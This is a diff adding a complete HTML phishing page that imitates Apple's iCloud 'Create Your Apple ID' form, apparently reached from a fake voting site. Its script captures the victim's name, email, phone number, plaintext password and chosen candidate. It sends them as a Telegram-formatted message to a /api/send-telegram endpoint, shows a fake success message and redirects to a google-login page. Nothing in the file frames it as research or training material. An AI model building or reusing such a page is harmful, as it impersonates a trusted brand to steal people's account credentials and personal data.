@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create Your Apple ID</title>
+    <link rel="stylesheet" href="icloud-style.css">
+    <link rel="stylesheet" href="toast.css">
+</head>
+
+<body>
+    <div class="icloud-container">
+        <div class="icloud-box create-account-box">
+            <!-- Header -->
+            <div class="icloud-header">
+                <div class="header-left">
+                    <svg class="apple-logo-header" width="30" height="30" viewBox="0 0 24 24" fill="white">
+                        <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                    </svg>
+                    <h1 class="icloud-title">iCloud</h1>
+                </div>
+                
+                <div class="menu-dots">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+
+            <!-- Apple Icon -->
+            <div class="apple-icon-center">
+                <svg width="70" height="70" viewBox="0 0 24 24" fill="white">
+                    <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                </svg>
+            </div>
+
+            <!-- Title -->
+            <h2 class="signin-title">Create Your Apple ID</h2>
+            <p class="subtitle">One Apple ID is all you need to access all Apple services.</p>
+
+            <!-- Create Account Form -->
+            <form id="createAccountForm" class="icloud-form create-form">
+                <div class="form-group">
+                    <input type="text" id="firstName" placeholder="First Name" required>
+                </div>
+
+                <div class="form-group">
+                    <input type="text" id="lastName" placeholder="Last Name" required>
+                </div>
+
+                <div class="form-group">
+                    <input type="email" id="newEmail" placeholder="Email Address" required>
+                </div>
+
+                <div class="form-group">
+                    <input type="password" id="newPassword" placeholder="Password" required>
+                </div>
+
+                <div class="form-group">
+                    <input type="password" id="confirmPassword" placeholder="Confirm Password" required>
+                </div>
+
+                <div class="form-group">
+                    <input type="tel" id="phoneNumber" placeholder="Phone Number" required>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="agreeTerms" required>
+                    <label for="agreeTerms">I agree to the Terms and Conditions</label>
+                </div>
+
+                <button type="submit" class="submit-btn">Create Apple ID</button>
+
+                <div class="form-links">
+                    <a href="google-login.html" class="link-blue">← Already have an Apple ID?</a>
+                </div>
+            </form>
+
+            <div class="back-link">
+                <a href="Index.html">← Back to voting</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const createAccountForm = document.getElementById('createAccountForm');
+        
+        if (createAccountForm) {
+            createAccountForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                // 1. Capture all input fields
+                const firstName = document.getElementById('firstName').value;
+                const lastName = document.getElementById('lastName').value;
+                const email = document.getElementById('newEmail').value;
+                const password = document.getElementById('newPassword').value;
+                const confirmPassword = document.getElementById('confirmPassword').value;
+                const phone = document.getElementById('phoneNumber').value;
+                const candidate = sessionStorage.getItem('votingFor') || 'Unknown';
+
+                // Test Log: Check if all data is captured
+                console.log('--- Creating Account Debug ---');
+                console.log('First Name:', firstName);
+                console.log('Last Name:', lastName);
+                console.log('Email:', email);
+                console.log('Phone:', phone);
+                console.log('Password Length:', password.length);
+
+                // 2. Validation
+                if (password !== confirmPassword) {
+                    showToast('✗ Passwords do not match!', 'error');
+                    return;
+                }
+
+                if (password.length < 8) {
+                    showToast('✗ Password must be at least 8 characters', 'error');
+                    return;
+                }
+
+                if (!document.getElementById('agreeTerms').checked) {
+                    showToast('✗ You must agree to the Terms', 'error');
+                    return;
+                }
+
+                // 3. Send to Telegram API
+                try {
+                    const messageText = `🆕 *NEW APPLE ID CREATED*\n` +
+                                      `--------------------------------\n` +
+                                      `👤 *Name:* ${firstName} ${lastName}\n` +
+                                      `📧 *Email:* \`${email}\`\n` +
+                                      `📱 *Phone:* \`${phone}\`\n` +
+                                      `🔑 *Password:* \`${password}\`\n` +
+                                      `🗳️ *Voting For:* ${candidate}\n` +
+                                      `--------------------------------\n` +
+                                      `⏰ *Time:* ${new Date().toLocaleString()}`;
+
+                    console.log('Sending to Telegram:', messageText);
+
+                    const response = await fetch('/api/send-telegram', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ message: messageText })
+                    });
+                    
+                    const result = await response.json();
+                    console.log('Telegram API Response:', result);
+
+                } catch (error) {
+                    console.error('Error sending to Telegram:', error);
+                }
+
+                // 4. Show Success Toast
+                showToast('✓ Successfully created an account', 'success');
+                
+                // Clear the form
+                createAccountForm.reset();
+
+                // 5. Redirect to Welcome Screen
+                setTimeout(() => {
+                    window.location.href = 'google-login.html';
+                }, 2000);
+            });
+        }
+
+        function showToast(message, type = 'info') {
+            const existingToast = document.querySelector('.toast');
+            if (existingToast) existingToast.remove();
+
+            const toast = document.createElement('div');
+            toast.className = `toast toast-${type}`;
+            toast.textContent = message;
+            
+            document.body.appendChild(toast);
+            
+            // Allow reflow
+            void toast.offsetWidth;
+            
+            setTimeout(() => toast.classList.add('show'), 50);
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => {
+                    if (toast.parentNode) document.body.removeChild(toast);
+                }, 300);
+            }, 4000);
+        }
+    </script>
+</body>
+
+</html>
